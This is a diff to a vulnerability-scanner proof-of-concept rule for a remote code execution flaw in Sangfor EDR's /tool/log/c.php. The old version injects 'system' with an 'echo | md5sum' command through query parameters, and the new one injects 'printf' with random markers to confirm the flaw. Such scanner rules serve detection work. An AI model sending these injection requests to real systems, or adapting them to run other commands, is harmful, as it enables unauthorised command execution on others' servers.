@@ -1,13 +1,12 @@
-name: poc-yaml-sangfor-edr-rce
+name: poc-yaml-sangfor-edr-tool-rce
 set:
-  r: randomInt(2000000000, 2100000000)
+  r1: randomLowercase(8)
+  r2: randomLowercase(8)
 rules:
   - method: GET
-    path: "/tool/log/c.php?strip_slashes=system&host=echo%20-n%20{{r}}|md5sum"
-    follow_redirects: true
-    expression: |
-      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
+    path: /tool/log/c.php?strip_slashes=printf&host={{r1}}%25%25{{r2}}
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(bytes(r1 + "%" + r2))
 detail:
-  author: cookie
   links:
-    - https://www.cnblogs.com/limanman233/p/13520066.html
+    - https://edr.sangfor.com.cn/
